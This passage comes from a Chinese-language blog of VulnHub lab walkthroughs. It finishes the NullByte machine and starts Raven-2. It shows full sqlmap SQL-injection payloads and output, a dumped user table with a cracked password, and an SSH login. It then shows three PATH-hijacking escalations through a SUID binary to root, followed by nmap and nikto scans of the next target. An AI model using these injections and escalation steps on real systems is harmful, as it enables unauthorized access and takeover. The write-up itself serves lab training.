class="string">&#x27;</span></span><br><span class="line"><span class="string">[10:41:53] [INFO] GET parameter &#x27;</span>usrtosearch<span class="string">&#x27; is &#x27;</span>MySQL &gt;= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)<span class="string">&#x27; injectable</span></span><br><span class="line"><span class="string">[10:41:53] [INFO] testing &#x27;</span>MySQL inline queries<span class="string">&#x27;</span></span><br><span class="line"><span class="string">[10:41:53] [INFO] testing &#x27;</span>MySQL &gt;= 5.0.12 stacked queries (comment)<span class="string">&#x27;</span></span><br><span class="line"><span class="string">[10:41:53] [INFO] testing &#x27;</span>MySQL &gt;= 5.0.12 stacked queries<span class="string">&#x27;</span></span><br><span class="line"><span class="string">[10:41:53] [INFO] testing &#x27;</span>MySQL &gt;= 5.0.12 stacked queries (query SLEEP - comment)<span class="string">&#x27;</span></span><br><span class="line"><span class="string">[10:41:53] [INFO] testing &#x27;</span>MySQL &gt;= 5.0.12 stacked queries (query SLEEP)<span class="string">&#x27;</span></span><br><span class="line"><span class="string">[10:41:53] [INFO] testing &#x27;</span>MySQL &lt; 5.0.12 stacked queries (heavy query - comment)<span class="string">&#x27;</span></span><br><span class="line"><span class="string">[10:41:53] [INFO] testing &#x27;</span>MySQL &lt; 5.0.12 stacked queries (heavy query)<span class="string">&#x27;</span></span><br><span class="line"><span class="string">[10:41:53] [INFO] testing &#x27;</span>MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)<span class="string">&#x27;</span></span><br><span class="line"><span class="string">[10:42:03] [INFO] GET parameter &#x27;</span>usrtosearch<span class="string">&#x27; appears to be &#x27;</span>MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)<span class="string">&#x27; injectable</span></span><br><span class="line"><span class="string">[10:42:03] [INFO] testing &#x27;</span>Generic UNION query (NULL) - 1 to 20 columns<span class="string">&#x27;</span></span><br><span class="line"><span class="string">[10:42:03] [INFO] testing &#x27;</span>MySQL UNION query (NULL) - 1 to 20 columns<span class="string">&#x27;</span></span><br><span class="line"><span class="string">[10:42:03] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found</span></span><br><span class="line"><span class="string">[10:42:03] [INFO] &#x27;</span>ORDER BY<span class="string">&#x27; technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test</span></span><br><span class="line"><span class="string">[10:42:03] [INFO] target URL appears to have 3 columns in query</span></span><br><span class="line"><span class="string">[10:42:03] [INFO] GET parameter &#x27;</span>usrtosearch<span class="string">&#x27; is &#x27;</span>MySQL UNION query (NULL) - 1 to 20 columns<span class="string">&#x27; injectable</span></span><br><span class="line"><span class="string">[10:42:03] [WARNING] in OR boolean-based injection cases, please consider usage of switch &#x27;</span>--drop-set-cookie<span class="string">&#x27; if you experience any problems during data retrieval</span></span><br><span class="line"><span class="string">GET parameter &#x27;</span>usrtosearch<span class="string">&#x27; is vulnerable. Do you want to keep testing the others (if any)? [y/N] N</span></span><br><span class="line"><span class="string">sqlmap identified the following injection point(s) with a total of 137 HTTP(s) requests:</span></span><br><span class="line"><span class="string">---</span></span><br><span class="line"><span class="string">Parameter: usrtosearch (GET)</span></span><br><span class="line"><span class="string">    Type: boolean-based blind</span></span><br><span class="line"><span class="string">    Title: OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)</span></span><br><span class="line"><span class="string">    Payload: usrtosearch=1111&quot; OR NOT 7451=7451#</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Type: error-based</span></span><br><span class="line"><span class="string">    Title: MySQL &gt;= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)</span></span><br><span class="line"><span class="string">    Payload: usrtosearch=1111&quot; AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x717a6a6271,(SELECT (ELT(9768=9768,1))),0x7171627171,0x78))s), 8446744073709551610, 8446744073709551610)))-- Irce</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Type: time-based blind</span></span><br><span class="line"><span class="string">    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)</span></span><br><span class="line"><span class="string">    Payload: usrtosearch=1111&quot; AND (SELECT 7630 FROM (SELECT(SLEEP(5)))fzHD)-- xAIX</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Type: UNION query</span></span><br><span class="line"><span class="string">    Title: MySQL UNION query (NULL) - 3 columns</span></span><br><span class="line"><span class="string">    Payload: usrtosearch=1111&quot; UNION ALL SELECT NULL,NULL,CONCAT(0x717a6a6271,0x7a5249786a7646744654494a6d676f4c78454f63675a7a4d786f757a42744a515649526e7574704b,0x7171627171)#</span></span><br><span class="line"><span class="string">---</span></span><br><span class="line"><span class="string">[10:42:03] [INFO] the back-end DBMS is MySQL</span></span><br><span class="line"><span class="string">back-end DBMS: MySQL &gt;= 5.5</span></span><br><span class="line"><span class="string">[10:42:03] [INFO] fetched data logged to text files under &#x27;</span>C:\Users\HASEE\AppData\Local\sqlmap\output\192.168.56.106<span class="string">&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[*] ending @ 10:42:03 /2020-01-02/</span></span><br></pre></td></tr></table></figure>

<p>查找其中的用户名和密码</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># sqlmap -r sqlmap.txt -D seth -T users --dump</span></span><br><span class="line">        ___</span><br><span class="line">       __H__                                                                                           </span><br><span class="line"> ___ ___[,]_____ ___ ___  &#123;1.3.12<span class="comment">#stable&#125;                                                              </span></span><br><span class="line">|_ -| . [.]     | .<span class="string">&#x27;| . |                                                                              </span></span><br><span class="line"><span class="string">|___|_  [.]_|_|_|__,|  _|                                                                              </span></span><br><span class="line"><span class="string">      |_|V...       |_|   http://sqlmap.org                                                            </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user&#x27;</span>s responsibility to obey all applicable <span class="built_in">local</span>, state and federal laws. Developers assume no liability and are not responsible <span class="keyword">for</span> any misuse or damage caused by this program</span><br><span class="line"></span><br><span class="line">[*] starting @ 21:53:36 /2020-01-01/</span><br><span class="line"></span><br><span class="line">[21:53:36] [INFO] parsing HTTP request from <span class="string">&#x27;sqlmap.txt&#x27;</span></span><br><span class="line">[21:53:36] [INFO] resuming back-end DBMS <span class="string">&#x27;mysql&#x27;</span> </span><br><span class="line">[21:53:36] [INFO] testing connection to the target URL</span><br><span class="line">sqlmap resumed the following injection point(s) from stored session:</span><br><span class="line">---</span><br><span class="line">Parameter: usrtosearch (GET)</span><br><span class="line">    Type: boolean-based blind</span><br><span class="line">    Title: OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)</span><br><span class="line">    Payload: usrtosearch=1111<span class="string">&quot; OR NOT 8608=8608#</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Type: error-based</span></span><br><span class="line"><span class="string">    Title: MySQL &gt;= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)</span></span><br><span class="line"><span class="string">    Payload: usrtosearch=1111&quot;</span> AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x716b767671,(SELECT (ELT(6518=6518,1))),0x7171706b71,0x78))s), 8446744073709551610, 8446744073709551610)))-- SFDc</span><br><span class="line"></span><br><span class="line">    Type: time-based blind</span><br><span class="line">    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)</span><br><span class="line">    Payload: usrtosearch=1111<span class="string">&quot; AND (SELECT 5358 FROM (SELECT(SLEEP(5)))oBUJ)-- bKCB</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Type: UNION query</span></span><br><span class="line"><span class="string">    Title: MySQL UNION query (NULL) - 3 columns</span></span><br><span class="line"><span class="string">    Payload: usrtosearch=1111&quot;</span> UNION ALL SELECT NULL,CONCAT(0x716b767671,0x564b5772465344646f7a6a79776666466b735572476570706b70585a4a704d624f704e54684f5172,0x7171706b71),NULL<span class="comment">#</span></span><br><span class="line">---</span><br><span class="line">[21:53:36] [INFO] the back-end DBMS is MySQL</span><br><span class="line">back-end DBMS: MySQL &gt;= 5.5</span><br><span class="line">[21:53:36] [INFO] fetching columns <span class="keyword">for</span> table <span class="string">&#x27;users&#x27;</span> <span class="keyword">in</span> database <span class="string">&#x27;seth&#x27;</span></span><br><span class="line">[21:53:36] [INFO] fetching entries <span class="keyword">for</span> table <span class="string">&#x27;users&#x27;</span> <span class="keyword">in</span> database <span class="string">&#x27;seth&#x27;</span></span><br><span class="line">Database: seth</span><br><span class="line">Table: users</span><br><span class="line">[2 entries]</span><br><span class="line">+----+---------------------------------------------+--------+------------+</span><br><span class="line">| id | pass                                        | user   | position   |</span><br><span class="line">+----+---------------------------------------------+--------+------------+</span><br><span class="line">| 1  | YzZkNmJkN2ViZjgwNmY0M2M3NmFjYzM2ODE3MDNiODE | ramses | &lt;blank&gt;    |</span><br><span class="line">| 2  | --not allowed--                             | isis   | employee   |</span><br><span class="line">+----+---------------------------------------------+--------+------------+</span><br><span class="line"></span><br><span class="line">[21:53:36] [INFO] table <span class="string">&#x27;seth.users&#x27;</span> dumped to CSV file <span class="string">&#x27;/root/.sqlmap/output/192.168.56.106/dump/seth/users.csv&#x27;</span>                                                                                             </span><br><span class="line">[21:53:36] [INFO] fetched data logged to text files under <span class="string">&#x27;/root/.sqlmap/output/192.168.56.106&#x27;</span></span><br><span class="line"></span><br><span class="line">[*] ending @ 21:53:36 /2020-01-01/</span><br></pre></td></tr></table></figure>

<p>得到ramses/YzZkNmJkN2ViZjgwNmY0M2M3NmFjYzM2ODE3MDNiODE，先将字符串YzZkNmJkN2ViZjgwNmY0M2M3NmFjYzM2ODE3MDNiODE解密，得到c6d6bd7ebf806f43c76acc3681703bODE然后在在线网站上将hash解密，得到值omega</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub124.jpg"></p>
<p>有了username和password，下面就是ssh连接</p>
<h3 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h3><p>使用ramses/omega连接ssh</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># ssh ramses@192.168.56.106 -p 777</span></span><br><span class="line">The authenticity of host <span class="string">&#x27;[192.168.56.106]:777 ([192.168.56.106]:777)&#x27;</span> can<span class="string">&#x27;t be established.</span></span><br><span class="line"><span class="string">ECDSA key fingerprint is SHA256:H/Y/TKggtnCfMGz457Jy6F6tUZPrvEDD62dP9A3ZIkU.</span></span><br><span class="line"><span class="string">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes</span></span><br><span class="line"><span class="string">Warning: Permanently added &#x27;</span>[192.168.56.106]:777<span class="string">&#x27; (ECDSA) to the list of known hosts.</span></span><br><span class="line"><span class="string">ramses@192.168.56.106&#x27;</span>s password: </span><br><span class="line"></span><br><span class="line">The programs included with the Debian GNU/Linux system are free software;</span><br><span class="line">the exact distribution terms <span class="keyword">for</span> each program are described <span class="keyword">in</span> the</span><br><span class="line">individual files <span class="keyword">in</span> /usr/share/doc/*/copyright.</span><br><span class="line"></span><br><span class="line">Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent</span><br><span class="line">permitted by applicable law.</span><br><span class="line">Last login: Sun Aug  2 01:38:58 2015 from 192.168.1.109</span><br><span class="line">ramses@NullByte:~$ id</span><br><span class="line">uid=1002(ramses) gid=1002(ramses) groups=1002(ramses)</span><br><span class="line">ramses@NullByte:~$ whoami</span><br><span class="line">ramses</span><br></pre></td></tr></table></figure>

<h3 id="提权1"><a href="#提权1" class="headerlink" title="提权1"></a>提权1</h3><p>查看具有SUID权限的二进制文件</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ramses@NullByte:~$ find / -perm -u=s -<span class="built_in">type</span> f 2&gt;/dev/null</span><br><span class="line">/usr/lib/openssh/ssh-keysign</span><br><span class="line">/usr/lib/policykit-1/polkit-agent-helper-1</span><br><span class="line">/usr/lib/eject/dmcrypt-get-device</span><br><span class="line">/usr/lib/pt_chown</span><br><span class="line">/usr/lib/dbus-1.0/dbus-daemon-launch-helper</span><br><span class="line">/usr/bin/procmail</span><br><span class="line">/usr/bin/at</span><br><span class="line">/usr/bin/chfn</span><br><span class="line">/usr/bin/newgrp</span><br><span class="line">/usr/bin/chsh</span><br><span class="line">/usr/bin/gpasswd</span><br><span class="line">/usr/bin/pkexec</span><br><span class="line">/usr/bin/passwd</span><br><span class="line">/usr/bin/sudo</span><br><span class="line">/usr/sbin/exim4</span><br><span class="line">/var/www/backup/procwatch</span><br><span class="line">/bin/su</span><br><span class="line">/bin/mount</span><br><span class="line">/bin/umount</span><br><span class="line">/sbin/mount.nfs</span><br></pre></td></tr></table></figure>

<p>发现/var/www/backup/procwatch的SUID位已启用，非常吸引人。 进一步探索它。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ramses@NullByte:~$ <span class="built_in">cd</span> /var/www/backup/</span><br><span class="line">ramses@NullByte:/var/www/backup$ ls</span><br><span class="line">procwatch  readme.txt</span><br><span class="line">ramses@NullByte:/var/www/backup$ cat readme.txt </span><br><span class="line">I have to fix this mess... </span><br><span class="line">ramses@NullByte:/var/www/backup$ ./procwatch </span><br><span class="line">  PID TTY          TIME CMD</span><br><span class="line"> 1664 pts/0    00:00:00 procwatch</span><br><span class="line"> 1665 pts/0    00:00:00 sh</span><br><span class="line"> 1666 pts/0    00:00:00 ps</span><br></pre></td></tr></table></figure>

<p>ummm,没有变成root用户，看来还需要做点什么<br>因此，当运行上述命令时，看起来procwatch文件正在尝试运行ps，这是/bin内用于处理状态的真实文件。 作者在这里可以考虑的最重要的事情是，作者已将procwatch的SUID位设置为ON，并且可能是调用系统功能（例如ps）的任何小程序文件。<br>利用它的优势，可以升级root特权并实现root该VM。 将必须操作环境PATH变量。 如果可以使procwatch运行sh而不是ps，它应该返回一个root shell。 以下使用环境$ PATH变量及其操作环境变量的方法称为Linux特权升级。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ramses@NullByte:/var/www/backup$ <span class="built_in">echo</span> <span class="string">&quot;/bin/sh&quot;</span>  &gt; ps</span><br><span class="line">ramses@NullByte:/var/www/backup$ chmod 777 ps</span><br><span class="line">ramses@NullByte:/var/www/backup$ <span class="built_in">echo</span> <span class="variable">$PATH</span></span><br><span class="line">/usr/<span class="built_in">local</span>/bin:/usr/bin:/bin:/usr/<span class="built_in">local</span>/games:/usr/games</span><br><span class="line">ramses@NullByte:/var/www/backup$ <span class="built_in">export</span> PATH=.:<span class="variable">$PATH</span></span><br><span class="line">ramses@NullByte:/var/www/backup$ <span class="built_in">echo</span> <span class="variable">$PATH</span></span><br><span class="line">.:/usr/<span class="built_in">local</span>/bin:/usr/bin:/bin:/usr/<span class="built_in">local</span>/games:/usr/games</span><br><span class="line">ramses@NullByte:/var/www/backup$ ./procwatch </span><br><span class="line"><span class="comment"># id</span></span><br><span class="line">uid=1002(ramses) gid=1002(ramses) euid=0(root) groups=1002(ramses)</span><br><span class="line"><span class="comment"># whoami</span></span><br><span class="line">root</span><br></pre></td></tr></table></figure>
<p>成功提权，帅呆了,提权方法太帅，记下来</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;/bin/sh&quot;</span> &gt; ps</span><br><span class="line">chmod 777 ps</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$PATH</span></span><br><span class="line"><span class="built_in">export</span> PATH=.:<span class="variable">$PATH</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$PATH</span></span><br><span class="line">./procwatch</span><br></pre></td></tr></table></figure>
<ul>
<li>$PATH中的“.”，表示用户能够从当前目录执行二进制文件/脚本。 通过执行以上命令，将获取root权限。</li>
</ul>
<p><font color="red">找到flag</font></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># cd /root</span></span><br><span class="line"><span class="comment"># ls</span></span><br><span class="line">proof.txt</span><br><span class="line"><span class="comment"># cat proof.txt </span></span><br><span class="line">adf11c7a9e6523e630aaf3b9b7acb51d</span><br><span class="line"></span><br><span class="line">It seems that you have pwned the box, congrats. </span><br><span class="line">Now you <span class="keyword">done</span> that I wanna talk with you. Write a walk &amp; mail at</span><br><span class="line">xly0n@sigaint.org attach the walk and proof.txt</span><br><span class="line">If sigaint.org is down you may mail at nbsly0n@gmail.com</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">USE THIS PGP PUBLIC KEY</span><br><span class="line"></span><br><span class="line">-----BEGIN PGP PUBLIC KEY BLOCK-----</span><br><span class="line">Version: BCPG C<span class="comment"># v1.6.1.0</span></span><br><span class="line"></span><br><span class="line">mQENBFW9BX8BCACVNFJtV4KeFa/TgJZgNefJQ+fD1+LNEGnv5rw3uSV+jWigpxrJ</span><br><span class="line">Q3tO375S1KRrYxhHjEh0HKwTBCIopIcRFFRy1Qg9uW7cxYnTlDTp9QERuQ7hQOFT</span><br><span class="line">e4QU3gZPd/VibPhzbJC/pdbDpuxqU8iKxqQr0VmTX6wIGwN8GlrnKr1/xhSRTprq</span><br><span class="line">Cu7OyNC8+HKu/NpJ7j8mxDTLrvoD+hD21usssThXgZJ5a31iMWj4i0WUEKFN22KK</span><br><span class="line">+z9pmlOJ5Xfhc2xx+WHtST53Ewk8D+Hjn+mh4s9/pjppdpMFUhr1poXPsI2HTWNe</span><br><span class="line">YcvzcQHwzXj6hvtcXlJj+yzM2iEuRdIJ1r41ABEBAAG0EW5ic2x5MG5AZ21haWwu</span><br><span class="line">Y29tiQEcBBABAgAGBQJVvQV/AAoJENDZ4VE7RHERJVkH/RUeh6qn116Lf5mAScNS</span><br><span class="line">HhWTUulxIllPmnOPxB9/yk0j6fvWE9dDtcS9eFgKCthUQts7OFPhc3ilbYA2Fz7q</span><br><span class="line">m7iAe97aW8pz3AeD6f6MX53Un70B3Z8yJFQbdusbQa1+MI2CCJL44Q/J5654vIGn</span><br><span class="line">XQk6Oc7xWEgxLH+IjNQgh6V+MTce8fOp2SEVPcMZZuz2+XI9nrCV1dfAcwJJyF58</span><br><span class="line">kjxYRRryD57olIyb9GsQgZkvPjHCg5JMdzQqOBoJZFPw/nNCEwQexWrgW7bqL/N8</span><br><span class="line">TM2C0X57+ok7eqj8gUEuX/6FxBtYPpqUIaRT9kdeJPYHsiLJlZcXM0HZrPVvt1HU</span><br><span class="line">Gms=</span><br><span class="line">=PiAQ</span><br><span class="line">-----END PGP PUBLIC KEY BLOCK-----</span><br></pre></td></tr></table></figure>

<p>将adf11c7a9e6523e630aaf3b9b7acb51d解密，结果是welldone22</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub125.jpg"></p>
<h3 id="提权2"><a href="#提权2" class="headerlink" title="提权2"></a>提权2</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ramses@NullByte:/var/www/backup$ cp /bin/sh /tmp/ps</span><br><span class="line">ramses@NullByte:/var/www/backup$ <span class="built_in">echo</span> <span class="variable">$PATH</span></span><br><span class="line">.:/usr/<span class="built_in">local</span>/bin:/usr/bin:/bin:/usr/<span class="built_in">local</span>/games:/usr/games</span><br><span class="line">ramses@NullByte:/var/www/backup$ <span class="built_in">export</span> PATH=/tmp:/usr/<span class="built_in">local</span>/bin:/usr/bin:/bin:/usr/<span class="built_in">local</span>/games:/usr/games</span><br><span class="line">ramses@NullByte:/var/www/backup$ ./procwatch</span><br><span class="line"><span class="comment"># id</span></span><br><span class="line">uid=1002(ramses) gid=1002(ramses) euid=0(root) groups=1002(ramses)</span><br><span class="line"><span class="comment"># whoami</span></span><br><span class="line">root</span><br></pre></td></tr></table></figure>

<h3 id="提权3"><a href="#提权3" class="headerlink" title="提权3"></a>提权3</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ramses@NullByte:/tmp$ nano ps</span><br><span class="line">ramses@NullByte:/tmp$ chmod 777 ps</span><br><span class="line">ramses@NullByte:/tmp$ <span class="built_in">echo</span> <span class="variable">$PATH</span></span><br><span class="line">/tmp:/usr/<span class="built_in">local</span>/bin:/usr/bin:/bin:/usr/<span class="built_in">local</span>/games:/usr/games</span><br><span class="line">ramses@NullByte:/tmp$ <span class="built_in">export</span> PATH=.:<span class="variable">$PATH</span></span><br><span class="line">ramses@NullByte:/tmp$ <span class="built_in">cd</span> /var/www/backup</span><br><span class="line">ramses@NullByte:/var/www/backup$ ./procwatch</span><br><span class="line"><span class="comment"># id</span></span><br><span class="line">uid=1002(ramses) gid=1002(ramses) euid=0(root) groups=1002(ramses)</span><br><span class="line"><span class="comment"># whoami</span></span><br><span class="line">root</span><br></pre></td></tr></table></figure>

<p><font color="red">Game over</font></p>
<p>不好意思，这次还是没有找到希腊某位大佬的傻瓜式一键通关脚本，i am so sorry about this…It’s a pity…</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/haha.jpg"></p>
<p><font color="green"><strong><em>The end,to be continue…</em></strong></font></p>
]]></content>
      <categories>
        <category>vulnhub walkthrough</category>
      </categories>
      <tags>
        <tag>vulnhub靶机练习</tag>
      </tags>
  </entry>
  <entry>
    <title>vulnhub靶机渗透[Raven-2]</title>
    <url>/2020/03/26/Raven-2/</url>
    <content><![CDATA[<h3 id="名称"><a href="#名称" class="headerlink" title="名称"></a>名称</h3><p>名称：Raven：2<br>发布日期：2018年11月9日</p>
<h3 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h3><ul>
<li>Download: <span class="exturl" data-url="aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL29wZW4/aWQ9MWZYcDRKUzhBTk9lQ2xuSzYzTHdnS1hsNTZCcUZKMjN6">https://drive.google.com/open?id=1fXp4JS8ANOeClnK63LwgKXl56BqFJ23z<i class="fa fa-external-link-alt"></i></span></li>
<li>Download (Mirror): <span class="exturl" data-url="aHR0cHM6Ly9kb3dubG9hZC52dWxuaHViLmNvbS9yYXZlbi9SYXZlbjIub3Zh">https://download.vulnhub.com/raven/Raven2.ova<i class="fa fa-external-link-alt"></i></span></li>
<li>Download (Torrent): <span class="exturl" data-url="aHR0cHM6Ly9kb3dubG9hZC52dWxuaHViLmNvbS9yYXZlbi9SYXZlbjIub3ZhLnRvcnJlbnQ=">https://download.vulnhub.com/raven/Raven2.ova.torrent<i class="fa fa-external-link-alt"></i></span></li>
</ul>
<a id="more"></a>

<h3 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h3><p>Raven 2是中等级别的boot2root VM。有四个要获取的flag。多次攻击破坏之后，Raven Security采取了额外的措施来加固Web服务器，以防止黑客入侵。您是否仍然可以crush Raven？</p>
<h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p>上nmap</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nmap -sn -v 192.168.56.*</span></span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.56.119</span><br><span class="line">Host is up (0.00022s latency).</span><br><span class="line">MAC Address: 08:00:27:A4:D6:91 (Oracle VirtualBox virtual NIC)</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nmap -sV -v -p- 192.168.56.119</span></span><br><span class="line">PORT      STATE SERVICE VERSION</span><br><span class="line">22/tcp    open  ssh     OpenSSH 6.7p1 Debian 5+deb8u4 (protocol 2.0)</span><br><span class="line">80/tcp    open  http    Apache httpd 2.4.10 ((Debian))</span><br><span class="line">111/tcp   open  rpcbind 2-4 (RPC <span class="comment">#100000)</span></span><br><span class="line">58132/tcp open  status  1 (RPC <span class="comment">#100024)</span></span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nmap -A -v -p 22,80,111,58132 192.168.56.119 --script=vuln -T4</span></span><br><span class="line">PORT      STATE SERVICE VERSION</span><br><span class="line">22/tcp    open  ssh     OpenSSH 6.7p1 Debian 5+deb8u4 (protocol 2.0)</span><br><span class="line">|_clamav-exec: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">80/tcp    open  http    Apache httpd 2.4.10 ((Debian))</span><br><span class="line">|_clamav-exec: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">| http-csrf: </span><br><span class="line">| Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=192.168.56.119</span><br><span class="line">|   Found the following possible CSRF vulnerabilities: </span><br><span class="line">|     </span><br><span class="line">|     Path: http://192.168.56.119:80/</span><br><span class="line">|     Form id: </span><br><span class="line">|     Form action: https://spondonit.us12.list-manage.com/subscribe/post?u=1462626880ade1ac87bd9c93a&amp;id=92a4423d01</span><br><span class="line">|     </span><br><span class="line">|     Path: http://192.168.56.119:80/service.html</span><br><span class="line">|     Form id: </span><br><span class="line">|     Form action: https://spondonit.us12.list-manage.com/subscribe/post?u=1462626880ade1ac87bd9c93a&amp;id=92a4423d01</span><br><span class="line">|     </span><br><span class="line">|     Path: http://192.168.56.119:80/contact.php</span><br><span class="line">|     Form id: myform</span><br><span class="line">|     Form action: </span><br><span class="line">|     </span><br><span class="line">|     Path: http://192.168.56.119:80/contact.php</span><br><span class="line">|     Form id: </span><br><span class="line">|     Form action: https://spondonit.us12.list-manage.com/subscribe/post?u=1462626880ade1ac87bd9c93a&amp;id=92a4423d01</span><br><span class="line">|     </span><br><span class="line">|     Path: http://192.168.56.119:80/index.html</span><br><span class="line">|     Form id: </span><br><span class="line">|     Form action: https://spondonit.us12.list-manage.com/subscribe/post?u=1462626880ade1ac87bd9c93a&amp;id=92a4423d01</span><br><span class="line">|     </span><br><span class="line">|     Path: http://192.168.56.119:80/wordpress/</span><br><span class="line">|     Form id: search-form-5e7c8d72d17d7</span><br><span class="line">|_    Form action: http://raven.local/wordpress/</span><br><span class="line">|_http-dombased-xss: Couldn<span class="string">&#x27;t find any DOM based XSS.</span></span><br><span class="line"><span class="string">| http-enum: </span></span><br><span class="line"><span class="string">|   /wordpress/: Blog</span></span><br><span class="line"><span class="string">|   /wordpress/wp-login.php: Wordpress login page.</span></span><br><span class="line"><span class="string">|   /css/: Potentially interesting directory w/ listing on &#x27;</span>apache/2.4.10 (debian)<span class="string">&#x27;</span></span><br><span class="line"><span class="string">|   /img/: Potentially interesting directory w/ listing on &#x27;</span>apache/2.4.10 (debian)<span class="string">&#x27;</span></span><br><span class="line"><span class="string">|   /js/: Potentially interesting directory w/ listing on &#x27;</span>apache/2.4.10 (debian)<span class="string">&#x27;</span></span><br><span class="line"><span class="string">|   /manual/: Potentially interesting folder</span></span><br><span class="line"><span class="string">|_  /vendor/: Potentially interesting directory w/ listing on &#x27;</span>apache/2.4.10 (debian)<span class="string">&#x27;</span></span><br><span class="line"><span class="string">|_http-server-header: Apache/2.4.10 (Debian)</span></span><br><span class="line"><span class="string">|_http-stored-xss: Couldn&#x27;</span>t find any stored XSS vulnerabilities.</span><br><span class="line">111/tcp   open  rpcbind 2-4 (RPC <span class="comment">#100000)</span></span><br><span class="line">|_clamav-exec: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">| rpcinfo: </span><br><span class="line">|   program version    port/proto  service</span><br><span class="line">|   100000  2,3,4        111/tcp   rpcbind</span><br><span class="line">|   100000  2,3,4        111/udp   rpcbind</span><br><span class="line">|   100000  3,4          111/tcp6  rpcbind</span><br><span class="line">|   100000  3,4          111/udp6  rpcbind</span><br><span class="line">|   100024  1          35360/udp6  status</span><br><span class="line">|   100024  1          35599/tcp6  status</span><br><span class="line">|   100024  1          46931/udp   status</span><br><span class="line">|_  100024  1          58132/tcp   status</span><br><span class="line">58132/tcp open  status  1 (RPC <span class="comment">#100024)</span></span><br><span class="line">|_clamav-exec: ERROR: Script execution failed (use -d to debug)</span><br></pre></td></tr></table></figure>

<p>上nikto</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nikto -C all -h 192.168.56.119</span></span><br><span class="line">+ OSVDB-3268: /img/: Directory indexing found.</span><br><span class="line">+ OSVDB-3092: /img/: This might be interesting...</span><br><span class="line">+ OSVDB-3092: /manual/: Web server manual found.</span><br><span class="line">+ OSVDB-3268: /manual/images/: Directory indexing found.</span><br><span class="line">+ OSVDB-6694: /.DS_Store: Apache on Mac OSX will serve the .DS_Store file, <span class="built_in">which</span> contains sensitive information. Configure Apache to ignore this file or upgrade to a newer version.</span><br><span class="line">+ OSVDB-3233: /icons/README: Apache default file found.</span><br><span class="line">+ Uncommon header <span class="string">&#x27;link&#x27;</span> found, with contents: &lt;http://raven.local/wordpress/index.php/wp-json/&gt;; rel=<span class="string">&quot;https://api.w.org/&quot;</span></span><br><span class="line">+ /wordpress/: A Wordpress installation was found.</span><br></pre></td></tr></table></figure>

<p>网站使用wordpress搭建的，现在把raven.local添加到kali的/etc/hosts文件中和windows的hosts文件中。。。<br>用dirbuster扫描网站，使用medium字典，看看能得到什么。</p>
<ul>
<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub217.jpg"></li>
</ul>
<h3 id="Flag1"><a href="#Flag1" class="headerlink" title="Flag1"></a>Flag1</h3><p>/vendor目录下有一个PATH文件，里面是第一个flag</p>
<ul>
<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub218.jpg"></li>
</ul>
